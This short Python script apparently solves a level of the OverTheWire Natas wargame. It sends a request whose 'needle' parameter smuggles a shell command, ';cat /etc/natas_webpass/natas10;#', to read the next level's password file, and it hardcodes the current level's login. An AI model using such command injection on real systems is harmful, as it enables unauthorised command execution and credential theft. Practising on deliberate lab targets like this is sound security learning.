import requests

username = "natas9"
password = "W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl"

url = "http://%s.natas.labs.overthewire.org?needle=;cat /etc/natas_webpass/natas10;#" % username
session = requests.Session()

response = session.get(url, auth = (username,password))


print response.text